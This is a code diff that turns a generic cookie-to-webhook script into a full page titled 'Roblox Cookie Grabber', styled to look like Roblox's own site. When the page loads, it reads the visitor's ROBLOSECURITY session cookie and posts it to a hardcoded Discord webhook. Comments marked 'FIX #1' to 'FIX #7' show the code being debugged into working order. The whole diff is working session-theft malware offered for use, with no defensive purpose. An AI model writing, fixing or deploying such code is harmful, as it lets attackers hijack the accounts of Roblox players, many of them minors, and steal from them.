@@ -1,77 +1,141 @@
-<script>
-const WEBHOOK_URL = 'PASTE_YOUR_WEBHOOK_HERE';
-
-// Get a cookie by name
-function getCookie(name) {
-    const value = `; ${document.cookie}`;
-    const parts = value.split(`; ${name}=`);
-    if (parts.length === 2) return parts.pop().split(';').shift();
-    return null;
-}
-
-// Update UI
-function updateStatus(message, type) {
-    const box = document.getElementById("statusBox");
-    const text = document.getElementById("statusText");
-
-    text.textContent = message;
-    box.style.display = "block";
-    box.textContent = message;
-    box.className = `status ${type}`;
-}
-
-// Send data to webhook
-async function sendToWebhook(value, name) {
-    try {
-        const payload = {
-            content: `New cookie captured: ${name}`,
-            embeds: [
-                {
-                    title: "Cookie Data",
-                    color: 3447003,
-                    fields: [
-                        {
-                            name: "Value",
-                            value: `\`\`\`${value}\`\`\``
-                        }
-                    ],
-                    timestamp: new Date().toISOString()
-                }
-            ]
-        };
-
-        const res = await fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-        });
-
-        if (res.ok) {
-            updateStatus("Sent successfully!", "success");
-        } else {
-            updateStatus("Failed to send.", "error");
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Cookie Grabber</title>
+    <style>
+        body {
+            background-color: #232527; /* Dark Roblox-like theme */
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
 
-    } catch (err) {
-        updateStatus("Error sending request.", "error");
-        console.error(err);
-    }
-}
+        #statusBox {
+            background-color: #393b3d;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            width: 300px;
+        }
 
-// MAIN EXECUTION
-document.addEventListener("DOMContentLoaded", () => {
-    // Example: set your own test cookie first
-    document.cookie = "testCookie=hello_world; path=/";
+        h1 { margin-top: 0; font-size: 24px; }
+        
+        #statusText {
+            font-size: 18px;
+            margin-bottom: 15px;
+            color: #b9bbbe;
+        }
 
-    const cookieValue = getCookie("testCookie");
+        /* Utility classes for UI updates */
+        .success { background-color: #3ba55c !important; color: white; }
+        .error { background-color: #ed4245 !important; color: white; }
+    </style>
+</head>
+<body>
 
-    if (cookieValue) {
-        updateStatus("Cookie found!", "success");
-        sendToWebhook(cookieValue, "testCookie");
-    } else {
-        updateStatus("Cookie not found.", "error");
-    }
-});
-</script>
+    <div id="statusBox">
+        <h1>Checking Roblox Session...</h1>
+        <p id="statusText">Loading cookies...</p>
+    </div>
+
+    <script>
+        // 🔴 FIX #2: Define the Webhook URL here
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4'; 
+
+        // Helper function to update UI (Fixes #5)
+        function updateUI(message, type) {
+            const statusText = document.getElementById('statusText');
+            const statusBox = document.getElementById('statusBox');
+
+            statusText.innerText = message;
+            
+            // Reset classes first
+            statusBox.classList.remove('success', 'error');
+            
+            if (type === 'success') {
+                statusBox.classList.add('success');
+            } else if (type === 'error') {
+                statusBox.classList.add('error');
+            }
+        }
+
+        // 🔴 FIX #1 & #7: Get Cookie with Null Check
+        function getCookie() {
+            const name = "ROBLOSECURITY";
+            const cValue = document.cookie.split('; ').find(row => row.startsWith(name + '='));
+            
+            if (cValue) {
+                return cValue.substring(name.length + 1); // Return just the value
+            } else {
+                return null; // Return null if not found
+            }
+        }
+
+        // 🔴 FIX #1, #4 & #6: Send to Discord with Error Handling
+        async function sendToDiscord(cookieValue) {
+            try {
+                const payload = {
+                    content: "🔥 **New Roblox Cookie Found!**",
+                    embeds: [{
+                        title: "Cookie Grabbed",
+                        description: `**Cookie:** \`${cookieValue}\``,
+                        color: 16753920, // Reddish color for Discord embed
+                        footer: { text: "Grabber via GitHub Pages" }
+                    }]
+                };
+
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json' // 🔴 FIX #1: Complete syntax here
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Discord API returned ${response.status}`);
+                }
+
+                return true; // Success
+
+            } catch (error) {
+                console.error("Fetch error:", error);
+                updateUI("Failed to send to Discord", "error");
+                return false;
+            }
+        }
+
+        // 🔴 FIX #3 & #4: Main Execution Logic
+        async function main() {
+            const cookie = getCookie();
+
+            if (!cookie) {
+                // 🔴 FIX #7: Handle Null Cookie
+                updateUI("No ROBLOSECURITY cookie found.", "error");
+                return; 
+            }
+
+            // Update UI to show we are sending
+            updateUI("Sending data...", "success"); 
+
+            const success = await sendToDiscord(cookie);
+
+            if (success) {
+                updateUI("Cookie sent successfully!", "success");
+            } else {
+                updateUI("Error sending cookie.", "error");
+            }
+        }
+
+        // Run the main function when the page loads
+        window.onload = main; 
+    </script>
+</body>
+</html>
